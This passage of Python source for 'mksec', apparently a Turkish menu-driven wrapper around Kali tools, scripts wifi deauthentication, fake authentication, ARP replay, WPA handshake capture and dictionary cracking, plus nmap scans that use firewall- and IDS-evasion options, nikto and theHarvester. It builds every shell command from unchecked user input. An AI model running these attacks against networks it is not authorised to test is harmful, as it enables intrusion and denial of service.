            \x1b[37m7\x1b[36m  Aireplay-ng ile Fake Auth
            \x1b[37m8\x1b[36m  Fake Auth Sonrasi Paket Yollamak
            \x1b[37m9\x1b[36m  Wpa Handshake Yakala
            \x1b[37m10\x1b[36m Wpa Cracking'""")
        userInput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        userInput = userInput.strip().lower()
        if userInput == "1":
            os.system("iwconfig")
            interface = input("\033[36m[mksec]\033[36m[interface]\033[0m ")
            os.system("ifconfig " + interface + " down")
            os.system("iwconfig " + interface + " mode monitor")
            os.system("ifconfig " + interface + " up")
            os.system("iwconfig")
            wirelessAttacks()
            # 1>> airmon-ng start wlan0	(monitor mode)
	        #     bu sayede monitor mode' a gecebiliriz.
	        #     kontrol etmek icin ifconfig kullan.
            # 2>> airmon-ng stop wlan0mon
	        #     bu sayede monitor mode' u devredisi birak. 
	        #     kontrol etmek icin ifconfig kullan.
        elif userInput == "2":
            os.system("iwconfig")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("ifconfig " + interface + " down")
            os.system("iwconfig " + interface + " mode managed")
            os.system("ifconfig " + interface + " up")
            os.system("iwconfig")
            wirelessAttacks() 
        elif userInput == "3":
            os.system("iwconfig")
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("airodump-ng " + interface)
        elif userInput == "4":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo 'once butun aglari inceleyin ve daha sonra kendinize hedef ag belirleyin\nhedef agin channel, bssid bilgilerini almaniz yeterlidir'")
            ch = input("\x1b[1m\033[36m[mksec]\033[36m[channel]\033[37m\x1b[0m ")
            bssid = input("\x1b[1m\033[36m[mksec]\033[36m[bssid]\033[37m\x1b[0m ")
            os.system("echo '\033[33mex:/root/Desktop/mksec\033[32m' ")
            write = input("\x1b[1m\033[36m[mksec]\033[36m[output]\033[37m\x1b[0m ")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("airodump-ng --channel " + ch + " --bssid " + bssid + " --write " + write + " " + interface)
        elif userInput == "5":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo 'once hedef aga bagli cihazlarin station bilgisini almalisiniz. station: hedef cihazin mac adresidir\nayrica hedef modemin bssid si gereklidir'")
            os.system("echo '\033[33mattack type\nex:10 = kisa sureli, 10000 = uzun sureli\033[32m' ")
            deauth = input("\x1b[1m\033[36m[mksec]\033[36m[deauth.packages]\033[37m\x1b[0m ")
            router = input("\x1b[1m\033[36m[mksec]\033[36m[router.bssid]\033[37m\x1b[0m ")
            target = input("\x1b[1m\033[36m[mksec]\033[36m[target.station]\033[37m\x1b[0m ")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("aireplay-ng --deauth " + deauth + " -a " + router + " -c " + target + " " + interface)
        elif userInput == "6":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo '\033[33monce 4. islemi yeni terminalde acik birakin ardindan bunu yapin\033[32m' ")
            os.system("echo '\033[33mex:/root/Desktop/test-01.cap\033[32m' ")
            location = input("\x1b[1m\033[36m[mksec]\033[36m[cap.file.location]\033[37m\x1b[0m ")
            os.system("aircrack-ng " + location + "")
        elif userInput == "7":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo '\033[33monce 4. islemi yeni terminalde acik birakin ardindan bunu yapin\033[32m' ")
            router = input("\x1b[1m\033[36m[mksec]\033[36m[router.bssid]\033[37m\x1b[0m ")
            os.system("iwconfig")
            os.system("ip addr")
            wifimac = input("\x1b[1m\033[36m[mksec]\033[36m[your.wifi.mac.addr]\033[37m\x1b[0m ")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("aireplay-ng --fakeauth 0 -a " + router + " -h " + wifimac + " " + interface)
        elif userInput == "8":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo '\033[33monce 4. islemi yeni terminalde acik birakin ardindan bunu yapin\033[32m' ")
            os.system("echo 'fake auth yaptiginiza emin olun'")
            router = input("\x1b[1m\033[36m[mksec]\033[36m[router.bssid]\033[37m\x1b[0m ")
            os.system("iwconfig")
            os.system("ip addr")
            wifimac = input("\x1b[1m\033[36m[mksec]\033[36m[your.wifi.mac.addr]\033[37m\x1b[0m ")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("aireplay-ng --arpreplay -b " + router + " -h " + wifimac + " " + interface)
        elif userInput == "9":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo '\033[33monce 4. islemi yeni terminalde acik birakin ardindan bunu yapin. kisa sureli deauth yapin ve 4. islemin sag ust kosesinde wpa handshake yazdiginda ctrl+c ile durdurun\033[32m' ")
            os.system("echo '\033[33mattack type\nex:10 = kisa sureli, 10000 = uzun sureli\033[32m' ")
            deauth = input("\x1b[1m\033[36m[mksec]\033[36m[deauth.packages]\033[37m\x1b[0m ")
            router = input("\x1b[1m\033[36m[mksec]\033[36m[router.bssid]\033[37m\x1b[0m ")
            target = input("\x1b[1m\033[36m[mksec]\033[36m[target.station]\033[37m\x1b[0m ")
            interface = input("\x1b[1m\033[36m[mksec]\033[36m[interface]\033[37m\x1b[0m ")
            os.system("aireplay-ng --deauth " + deauth + " -a " + router + " -c " + target + " " + interface)
        elif userInput == "10":
            os.system("echo 'monitor mode kullandiginizdan emin olun'")
            os.system("echo '\033[33monce 4. islemi yeni terminalde acik birakin ardindan bunu yapin\033[32m' ")
            os.system("echo '\033[33mex : /root/Desktop/handshake-file-01.cap\033[32m' ")
            handshake = input("\x1b[1m\033[36m[mksec]\033[36m[handshake.file]\033[37m\x1b[0m ")
            os.system("echo '\033[33mex : /root/Desktop/wordlist\033[32m' ")
            wordlist = input("\x1b[1m\033[36m[mksec]\033[36m[wordlist.file]\033[37m\x1b[0m ")
            os.system("aircrack-ng " + handshake + " -w " + wordlist)
        elif userInput == "":
            os.system("clear")
            wirelessAttacks()
        elif userInput == "exit":
            quit()
        elif userInput == "quit":
            quit()
        elif userInput == "help":
            os.system("clear")
            help()
        elif userInput == "-h":
            os.system("clear")
            help()
        elif userInput == "--help":
            os.system("clear")
            help()
        elif userInput == "?":
            os.system("clear")
            help()
        elif userInput == "about":
            os.system("clear")
            about()
        elif userInput == "back":
            os.system("clear")
            MainMenu()
        else:
            os.system("clear")
            wirelessAttacks()

    def exploitationTools():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\x1b[7m\n\tExploitation Tools\n\n\x1b[0m\x1b[1m\x1b[37m01\x1b[36m Payload Creator and Listener\n\x1b[37m02\x1b[36m Searchsploit\n\x1b[37m03\x1b[36m Veil")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "payload creator and listener":
            PayloadCreatorAndListener()
        elif uinput == "2" or uinput == "02" or uinput == "searchsploit":
            searchsploit()
        elif uinput == "3" or uinput == "03" or uinput == "veil":
            veil()
        elif uinput == "":
            os.system("clear")
            exploitationTools()

    def sniffingSpoofing():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tSniffing & Spoofing\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Macchanger\n\x1b[37m02\x1b[36m Mitmproxy\n\x1b[37m03\x1b[36m Netsniff-ng\n\x1b[37m04\x1b[36m Responder\n\x1b[37m05\x1b[36m Arpspoof")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "macchanger":
            macchanger()
        elif uinput == "2" or uinput == "02" or uinput == "mitmproxy":
            macchanger()
        elif uinput == "3" or uinput == "03" or uinput == "netsniff-ng":
            macchanger()
        elif uinput == "4" or uinput == "04" or uinput == "responder":
            responder()
        elif uinput == "5" or uinput == "05" or uinput == "arpspoof":
            arpspoof()
        elif uinput == "":
            os.system("clear")
            sniffingSpoofing()

    def postExploitation():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tPost Exploitation\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Exe2hex\n\x1b[37m02\x1b[36m Weevely\n\x1b[37m03\x1b[36m Veil")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "exe2hex":
            exe2hex()
        elif uinput == "2" or uinput == "02" or uinput == "weevely":
            weevely()
        elif uinput == "3" or uinput == "03" or uinput == "veil":
            veil()
        elif uinput == "":
            os.system("clear")
            postExploitation()

    def forensics():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tForensics\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Binwalk\n\x1b[37m02\x1b[36m Bulk_extractor\n\x1b[37m03\x1b[36m Foremost\n\x1b[37m04\x1b[36m Hashdeep")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "binwalk":
            binwalk()
        elif uinput == "2" or uinput == "02" or uinput == "bulk_extractor":
            bulkExtractor()
        elif uinput == "3" or uinput == "03" or uinput == "foremost":
            foremost()
        elif uinput == "4" or uinput == "04" or uinput == "hashdeep":
            hashdeep()
        elif uinput == "":
            os.system("clear")
            forensics()

    def reportingTools():
        RandomBannerSelector()
        print("""\x1b[1m\x1b[36m\n\x1b[7m\tReporting Tools\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Cutycapt\n\x1b[37m02\x1b[36m Pipal""")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "cutycapt":
            cutycapt()
        elif uinput == "2" or uinput == "02" or uinput == "pipal":
            pipal()
        elif uinput == "":
            os.system("clear")
            reportingTools()

    def linuxcommands():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tLinux Commands\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Find\n\x1b[37m02\x1b[36m Grep\n\x1b[37m03\x1b[36m Man\n\x1b[37m04\x1b[36m Cli\n\x1b[37m05\x1b[36m All Linux Commands")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "find":
            os.system("clear")
            find()
        elif uinput == "2" or uinput == "02" or uinput == "grep":
            os.system("clear")
            grep()
        elif uinput == "3" or uinput == "03" or uinput == "man":
            os.system("clear")
            man()
        elif uinput == "4" or uinput == "04" or uinput == "cli":
            os.system("clear")
            cli()
        elif uinput == "5" or uinput == "05" or uinput == "alc":
            os.system("clear")
            alc()
        elif uinput == "":
            os.system("clear")
            linuxcommands()
    # tools
    def dmitry():
        url = "                         "
        output = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[dmitry]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mCollects information from the target site.\n\x1b[33mTR:\x1b[37mHedef siteden bilgi toplar.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nURL   {}     YES         Target site \x1b[32mex: test.com\x1b[37m\nOUTPUT{}     YES         Where you want to save? \x1b[32mex: /root/Desktop/test\x1b[37m".format(url,output))
            elif "set url" in uinput.lower():
                url = uinput
                url = url.replace("set url ","").replace("set URL ","").replace("SET url ","").replace("SET URL ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif uinput.lower() == "run":
                os.system("sudo dmitry -winsepf " + url.strip() + " -o " + output.strip())

    def ikeScan():
        ip = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[ike-scan]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mTests whether the IP address is a VPN server. \x1b[1m\x1b[33mEX:\x1b[37m Search 'ike' on Shodan and test the resulting ip address.\n\x1b[33mTR:\x1b[37mIP adresinin vpn server olup olmadigini test eder. \x1b[33mÖRN: \x1b[37mShodan üzerinden 'ike' aramasını yap ve çıkan ip adresini test et.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIP    {}     YES         Target ip address \x1b[32mex: 108.96.10.8\x1b[37m".format(ip))
            elif "set ip" in uinput.lower():
                ip = uinput
                ip = ip.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "run" in uinput.lower():
                os.system("sudo ike-scan " + ip.strip())

    def netdiscover():
        youriface = os.popen('ip addr').read().split("2:")[1].split(":")[0]
        ipv4 = os.popen('ip addr show {}'.format(youriface)).read().split("inet ")[1].split("/")[0]
        iprange = "                         "
        iface = "      {}             ".format(youriface)
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[netdiscover]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mScans devices on the local network. Displays IP addresses.\n\x1b[33mTR:\x1b[37mLocal ağdaki cihazları tarar. IP adreslerini görüntüler.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIFACE    {}    YES         Your interface  =\x1b[32m{}\x1b[37m\nIP       {}    YES         Your IP address = \x1b[32m{} \x1b[36mex: /24, /16, /8\x1b[37m".format(iface,youriface,iprange,ipv4))
            elif "set ip" in uinput.lower():
                iprange = uinput
                iprange = iprange.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "set iface" in uinput.lower():
                iface = uinput
                iface = iface.replace("set iface ","").replace("set IFACE ","").replace("SET iface ","").replace("SET IFACE ","").center(25)
            elif "run" in uinput.lower():
                os.system("sudo netdiscover -i " + iface.strip() + " -r " +  iprange.strip())

    def nbtscan():
        ip = "                         "
        youriface = os.popen('ip addr').read().split("2:")[1].split(":")[0]
        ipv4 = os.popen('ip addr show {}'.format(youriface)).read().split("inet ")[1].split("/")[0]
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[nbtscan]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mScans devices on the local network with netbios. Displays IP addresses.\n\x1b[33mTR:\x1b[37mLocal ağdaki cihazları netbios ile tarar. IP adreslerini görüntüler.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIP       {}    YES         Your IP address = \x1b[32m{} \x1b[36mex: /24, /16, /8\x1b[37m".format(ip,ipv4))
            elif "set ip" in uinput.lower():
                ip = uinput
                ip = ip.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "run" in uinput.lower():
                os.system("sudo nbtscan " + ip.strip())

    def theHarvester():
        domain = "                         "
        output = "                         "
        source = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[theharvester]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mScans the target site in search engines (google, shodan etc...). If the \x1b[36m'run'\x1b[37m command does not work, try with \x1b[36m'run -f'\x1b[37m (-f : --force). \n\x1b[33mTR:\x1b[37mHedef siteyi arama motorlarında(google,shodan vs...)tarar. \x1b[36m'run'\x1b[37m komutu çalışmazsa \x1b[36m'run -f'\x1b[37m (-f : --force) ile deneyiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nDOMAIN   {}    YES         Target domain \x1b[32mex: test.com\x1b[37m\nOUTPUT   {}    YES         Where you want to save? \x1b[32mex: /root/Desktop/test\x1b[37m\nSOURCE   {}    YES         From which source? Multiple sources can be added. To view resources: \x1b[32m'--sources'\x1b[37m".format(domain,output,source))
            elif "set domain" in uinput.lower():
                domain = uinput
                domain = domain.replace("set domain ","").replace("set DOMAIN ","").replace("SET domain ","").replace("SET DOMAIN ","").center(25)
            elif "set output" in uinput.lower():
                output = uinput
                output = output.replace("set output ","").replace("set OUTPUT ","").replace("SET output ","").replace("SET OUTPUT ","").center(25)
            elif "set source" in uinput.lower():
                source = uinput
                source = source.replace("set source ","").replace("set SOURCE ","").replace("SET source ","").replace("SET SOURCE ","").center(25)
            elif "--sources" == uinput.lower():
                print("\x1b[1m\x1b[32mbaidu, bing, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, exalead, github-code, google, hackertarget, hunter, intelx, linkedin,linkedin_links, netcraft, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello,twitter, urlscan, virustotal, yahoo\x1b[32m")
            elif "run" == uinput.lower():
                os.system("theHarvester -d " + domain.strip() + " -l 50 -b " + source.strip() + " -f " +  output.strip())
            elif "run -f" == uinput.lower():
                os.system("cd /opt/theHarvester/ && python3 theHarvester.py -d " + domain.strip() + " -l 50 -b " + source.strip() + " -f " +  output.strip())

    def nmap():
        ip = "                         "
        port = "                         "
        special = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[nmap]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mNmap, short for Network Mapper, is a free, open-source tool for vulnerability scanning and network discovery.\n\x1b[33mTR:\x1b[37mNetwork Mapper'ın kısaltması olan Nmap, güvenlik açığı taraması ve ağ keşfi için ücretsiz, açık kaynaklı bir araçtır. ")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIP       {}    YES         Target IP address  \x1b[32mex: test.com / 108.96.10.8 / 108.96.10.8/16\x1b[37m\nPORT     {}    OPT         Target port(s) \x1b[36mdefault: --top-ports 1000 \x1b[32mex: -p- / -p21,-80 / p21-443\x1b[37m\nSPECIAL  {}    OPT         Optionally more parameters can be added for nmap. To see the parameters: \x1b[32m'--parameters' or '-p'\x1b[37m".format(ip,port,special))
            elif "--param" in uinput.lower() or "-p" == uinput.lower():
                print("\x1b[1m\x1b[33mParameters\x1b[37m      \x1b[33mDescription\x1b[37m\n\x1b[33m==========\x1b[37m      \x1b[33m===========\x1b[37m\n\x1b[32m-v:\x1b[37m          \x1b[33mEN:\x1b[37m Verbose. \x1b[33mTR:\x1b[37m Ayrıntılı bilgi.\n\x1b[32m-vv:\x1b[37m         \x1b[33mEN:\x1b[37m More verbose. \x1b[33mTR:\x1b[37m Daha ayrıntılı bilgi.\n\x1b[32m-p-:\x1b[37m         \x1b[33mEN:\x1b[37m Scans all ports. \x1b[33mTR:\x1b[37m Bütün portları tarar.\n\x1b[32m-p 1-100:\x1b[37m    \x1b[33mEN:\x1b[37m Scans all ports 1 to 100. \x1b[33mTR:\x1b[37m 1 ile 100 arasındaki bütün portları tarar.\n\x1b[32m-sS:\x1b[37m         \x1b[33mEN:\x1b[37m Does a SYN scan. (This is the fastest scan.) \x1b[33mTR:\x1b[37m SYN taraması yapar. (En hızlı taramadır.)\n\x1b[32m-sV:\x1b[37m         \x1b[33mEN:\x1b[37m Service version scan. (FTP, SSH, Telnet etc...) \x1b[33mTR:\x1b[37m Servis versiyon taramasıdır. (FTP, SSH , Telnet vs...)\n\x1b[32m-sT:\x1b[37m         \x1b[33mEN:\x1b[37m Tries to establish a connection by capturing a handshake. (SYN,SYN-ACK,ACK) (Not recommended because it leaves logs and can be blocked by firewall.)\n             \x1b[33mTR:\x1b[37m Handshake yakalayarak bağlantı kurmaya çalışır. (SYN,SYN-ACK,ACK) (Önerilmez çünkü log kaydı bırakır ve firewall tarafından engellenebilir.)\n\x1b[32m-sU:\x1b[37m         \x1b[33mEN:\x1b[37m Scans for UDP. \x1b[33mTR:\x1b[37m UDP taraması yapar.\n\x1b[32m-sA:\x1b[37m         \x1b[33mEN:\x1b[37m Scans for ACK. (Usually for firewall) \x1b[33mTR:\x1b[37m ACK taraması yapar. (Genellikle firewall için)\n\x1b[32m-sP:\x1b[37m         \x1b[33mEN:\x1b[37m Tests whether the systems are on or off by pinging. \x1b[33mTR:\x1b[37m Ping atarak sistemlerin açık - kapalı olduğunu test eder.\n\x1b[32m-A:\x1b[37m          \x1b[33mEN:\x1b[37m Aggressive scanning (nmap .nse(\x1b[36mN\x1b[37mmap \x1b[36mS\x1b[37mcript \x1b[36mE\x1b[37mngine) runs all scripts.)  \x1b[33mTR:\x1b[37m Agresif tarama (nmap .nse(\x1b[36mN\x1b[37mmap \x1b[36mS\x1b[37mcript \x1b[36mE\x1b[37mngine) scriptlerin hepsini çalıştırır.)\n\x1b[32m-O:\x1b[37m          \x1b[33mEN:\x1b[37m Operating system detection. \x1b[33mTR:\x1b[37m İşletim sistemi tespiti yapmaya çalışır.\n\x1b[32m-Pn:\x1b[37m         \x1b[33mEN:\x1b[37m No ping.\n\x1b[32m-PS:\x1b[37m         \x1b[33mEN:\x1b[37m Sends TCP SYN packets. \x1b[33mTR:\x1b[37m TCP SYN paketleri gönderir.\n\x1b[32m-PA:\x1b[37m         \x1b[33mEN:\x1b[37m Sends TCP ACK packets. \x1b[33mTR:\x1b[37m TCP ACK paketleri gönderir.\n\x1b[32m-PU:\x1b[37m         \x1b[33mEN:\x1b[37m Sends UDP packets. \x1b[33mTR:\x1b[37m UDP paketleri gönderir.\n\x1b[32m-PE:\x1b[37m         \x1b[33mEN:\x1b[37m Tests whether the systems are on or off using ICMP packets. \x1b[33mTR:\x1b[37m ICMP paketleri kullanarak sistemlerin açık - kapalı olduğunu test eder.\n\x1b[32m-PR:\x1b[37m         \x1b[33mEN:\x1b[37m Tests whether the systems are on or off using ARP packages. \x1b[33mTR:\x1b[37m ARP paketleri kullanarak sistemlerin açık - kapalı olduğunu test eder.\n\x1b[32m-T4:\x1b[37m         \x1b[33mEN:\x1b[37m Sets the speed limit. (It should take a value between 0-5.) Default value : 3 \x1b[33mTR:\x1b[37m Hız limitini ayarlar. (0-5 arasında değer almalıdır.) Varsayılan değer : 3\n\x1b[32m-D:\x1b[37m          \x1b[33mEN:\x1b[37m Decoy, pretends to be browsing from another network. Used to bypass firewall. (Example available.) RND:10 = [Decoy with 10 devices] \x1b[33m\n\t     TR:\x1b[37m Decoy (tuzak), başka bir ağdan tarama yapıyormuş gibi gösterir. Firewall atlatmak için kullanılır. (Örnek mevcuttur.) RND:10 = [10 tane cihaz ile tuzak]\n\x1b[32m-F:\x1b[37m          \x1b[33mEN:\x1b[37m We try to bypass firewall, ids, ips devices. It sends the packet sizes we use by splitting it into 8 bytes (normally 1500 bytes). \x1b[33m\n\t     TR:\x1b[37m Firewall, ids, ips cihazlarını atlatmaya çalışırız. Kullandığımız paket boyutlarını 8 byte şeklinde parçalayarak gönderir (Normalde ortalama 1500 byte)\n\x1b[32m-mtu 16:\x1b[37m     \x1b[33mEN:\x1b[37m \x1b[31mM\x1b[37maximum \x1b[31mT\x1b[37mransmission \x1b[31mU\x1b[37mnit. We try to bypass firewall, ids, ips devices by determining the packet size ourselves [16,32,64,128]. \x1b[33m\n\t     TR:\x1b[37m \x1b[31mM\x1b[37maximum \x1b[31mT\x1b[37mransmission \x1b[31mU\x1b[37mnit. Paket boyutunu kendimiz belirleyerek [16,32,64,128] firewall, ids, ips cihazlarını atlatmaya çalışırız.\n\x1b[32m-iL:\x1b[37m         \x1b[33mEN:\x1b[37m It allows us to add a list. We must write the IP addresses (or host addresses) that we have determined for the list, line by line. \x1b[33m\n\t     TR:\x1b[37m Liste eklememizi sağlar. Liste için belirlediğimiz IP adreslerini (ya da host adreslerini) satır satır yazmalıyız.\n\x1b[32m-d:\x1b[37m          \x1b[33mEN:\x1b[37m Debug. \x1b[33mTR:\x1b[37m Hata ayıklama.\n\x1b[32m--reason:\x1b[37m    \x1b[33mEN:\x1b[37m Reason. \x1b[33mTR:\x1b[37m Sebep.\n\x1b[32m-oA:\x1b[37m         \x1b[33mEN:\x1b[37m Output. \x1b[33mTR:\x1b[37m Çıktı almamızı sağlar.\n\x1b[32m-oN:\x1b[37m         \x1b[33mEN:\x1b[37m Output. (It's in the examples section.) \x1b[33mTR:\x1b[37m Çıktı almamızı sağlar. (Örnekler kısmında mevcut.)\n\x1b[32m--script vuln:\x1b[37m \x1b[33mEN:\x1b[37m Scans for vulnerabilities with Nmap scripts. \x1b[33mTR:\x1b[37m Nmap scriptleri ile güvenlik açıkları tarar.\n\x1b[32m--top-ports 108:\x1b[37m \x1b[33mEN:\x1b[37m The 108 most popular ports are shown. (108 can be changed) \x1b[33mTR:\x1b[37m En popüler 108 port gösterilir. (108 değiştirilebilir)\n\x1b[32m-p 1-100 --exclude-ports 23,25:\x1b[37m \x1b[33mEN:\x1b[37m Ports 1 to 100 are scanned, except 23 and 25. \x1b[33mTR:\x1b[37m 23 ve 25 hariç 1 ile 100 arasindaki portlar taranır.\n\n\x1b[34mEX:\x1b[37m nmap --script vuln 192.168.109\n\x1b[34mEX:\x1b[37m nmap --script http-enum.nse -p 80 10.8.1.08\n\x1b[34mEX:\x1b[37m nmap --script ftp-vsftpd-backdoor -p 21 165.165.45.23\n\x1b[34mEX:\x1b[37m nmap -sS -O 10.8.1.08\n\x1b[34mEX:\x1b[37m nmap -sS -sV -O -T4 -p- 10.8.1.08\n\x1b[34mEX:\x1b[37m nmap -sS -iL /root/Desktop/deneme.txt -p 80\n\x1b[34mEX:\x1b[37m nmap -D 192.168.8.108 192.168.8.109\n\x1b[34mEX:\x1b[37m nmap -D RND:10 192.168.8.109\n\x1b[34mEX:\x1b[37m nmap -sS -sV -O -T4 -oN deneme.txt 192.168.8.109\n\x1b[34mEX:\x1b[37m nmap -f 192.168.109")
            elif "set ip" in uinput.lower():
                ip = uinput
                ip = ip.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "set port" in uinput.lower():
                port = uinput
                port = port.replace("set port ","").replace("set PORT ","").replace("SET port ","").replace("SET PORT ","").center(25)
            elif "set special" in uinput.lower():
                special = uinput
                special = special.replace("set special ","").replace("set SPECIAL ","").replace("SET special ","").replace("SET SPECIAL ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo nmap " + special.strip() + " " +  ip.strip() + " " + port.strip())

    def nikto():
        ip = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[nikto]\033[37m\x1b[0m ")
            UserInputs(uinput+"vuln")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mScans the target system for vulnerabilities.\n\x1b[33mTR:\x1b[37mHedef sistemde zafiyet taraması yapar.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIP    {}    YES          Target ip address \x1b[32mex: 192.168.10.8 or test.com\x1b[37m".format(ip))
            elif "set ip" in uinput.lower():
                ip = uinput
                ip = ip.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo nikto -h " + ip.strip())

    def unixPrivescCheck():
        check = "                         "
        while 1:
